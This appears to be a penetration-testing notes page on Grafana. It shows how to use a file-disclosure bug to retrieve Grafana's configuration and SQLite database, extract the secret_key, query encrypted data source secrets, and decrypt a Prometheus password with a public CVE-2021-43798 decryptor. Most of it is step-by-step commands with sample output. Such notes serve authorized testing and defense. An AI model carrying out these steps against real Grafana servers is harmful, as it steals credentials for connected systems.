---
Primary_category: "[[WEB TECHNOLOGIES]]"
title: "GRAFANA"
draft: false
banner: "https://images.unsplash.com/photo-1589763472885-46dd5b282f52?q=80&w=1748&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D"
banner_y: 0.88286
tags:
cssclasses:
---

###### PRIMARY CATEGORY → WEB TECHNOLOGIES

#### *Theory*

*Grafana* is a data visualization and monitoring platform that listens on TCP port **`3000`** by default.

It stores users, dashboards, data sources and other internal information in a relational database. *SQLite* is used by default, although ***[[3306 - MYSQL|MySQL]]*** and *PostgreSQL* are also supported.

Sensitive data source settings, including passwords, tokens and private keys, are encrypted before being stored inside the **`secure_json_data`** column.

---

#### *Data Source Secret Decryption*

##### *Workflow*

Suppose that a *File Disclosure* vulnerability allows arbitrary files to be retrieved from a server running *Grafana*.

In a package-based installation, the most relevant files are usually:

```bash
/etc/grafana/grafana.ini
/usr/share/grafana/conf/defaults.ini
/var/lib/grafana/grafana.db
```

The configuration files may disclose the **`secret_key`** used to protect data source secrets, while **`grafana.db`** may contain their encrypted values.

For a *Prometheus* data source using *Basic Authentication*, the username is normally stored in **`basic_auth_user`** and the encrypted password appears as **`basicAuthPassword`** inside **`secure_json_data`**.

The attack therefore consists of obtaining the effective **`secret_key`**, extracting the encrypted value from the database and decrypting it locally.

> ***The value from*** **`defaults.ini`** ***is only the default. An active value in*** **`grafana.ini`** ***or the*** **`GF_SECURITY_SECRET_KEY`** ***environment variable takes precedence.***

> ***The*** **`admin_password`** ***setting only defines the initial administrator password during the first Grafana startup. It does not necessarily contain the current password.***

##### *Requirements*

- ***Arbitrary file-read access to the Grafana configuration and database files***

- ***A Grafana installation using SQLite as its database backend***

- ***The effective*** **`secret_key`** ***used by the same Grafana instance***

- ***An encrypted secret stored in the*** **`data_source.secure_json_data`** ***column***

> ***Grafana 9.0 and later use envelope encryption by default. In those versions, the*** **`secret_key`** ***alone may not be sufficient and legacy decryptors may fail.***

##### *Abuse*

###### *Extracting the Grafana Files*

Use the discovered *File Disclosure* primitive to retrieve the following resources:

```bash
/etc/grafana/grafana.ini
/usr/share/grafana/conf/defaults.ini
/var/lib/grafana/grafana.db
```

Save them locally as **`grafana.ini`**, **`defaults.ini`** and **`grafana.db`**.

###### *Extracting the Secret Key*

Search the configuration files for relevant security settings:

```bash
grep -nPi --color -- '^\s*(admin_user|admin_password|secret_key)\s*=' defaults.ini grafana.ini
```

> [!TLDR]- *Command Output*
>
> ```bash
> defaults.ini:<LINE>:secret_key = <SECRET_KEY>
> ```

If both files define **`secret_key`**, use the effective value from **`grafana.ini`**.

###### *Enumerating the Data Sources*

Verify that the retrieved database is valid and inspect its tables:

```bash
file grafana.db
sqlite3 grafana.db '.tables'
```

Query the relevant data source fields:

```bash
sqlite3 -header -column grafana.db 'SELECT id, name, type, url, basic_auth, basic_auth_user, secure_json_data FROM data_source;'
```

> [!TLDR]- *Command Output*
>
> ```bash
> id  name        type        url                    basic_auth  basic_auth_user  secure_json_data
> 1   Prometheus  prometheus  http://localhost:9090  1           prometheus       {"basicAuthPassword":"<ENCRYPTED_VALUE>"}
> ```

###### *Setting up the Grafana Decryptor*

> ***[Grafana Decryptor](https://github.com/Sic4rio/Grafana-Decryptor-for-CVE-2021-43798)***

```bash
git clone 'https://github.com/Sic4rio/Grafana-Decryptor-for-CVE-2021-43798' GrafanaDecryptor
```

```bash
cd GrafanaDecryptor
python3 -m venv .venv
. .venv/bin/activate
python3 -m pip install -r requirements.txt
```

The script contains Grafana's historical default key hardcoded in the **`grafanaIni_secretKey`** variable. Replace it with the value extracted from the target:

```bash
sed -i 's/SW2YcwTIb9zpOOhoPsMm/<SECRET_KEY>/' decrypt.py
```

###### *Decrypting the Data Source Password*

Run the decryptor and provide the extracted **`basicAuthPassword`** value:

```bash
python3 decrypt.py
```

> [!TLDR]- *Command Output*
>
> ```bash
> ? Enter the datasource password: <ENCRYPTED_VALUE>
> 
> [*] grafanaIni_secretKey= <SECRET_KEY>
> [*] DataSourcePassword= <ENCRYPTED_VALUE>
> [*] plainText= <PLAINTEXT_PASSWORD>
> ```

The recovered value is the password used by Grafana to authenticate against the *Prometheus* data source. It is not necessarily a Grafana user or administrator password.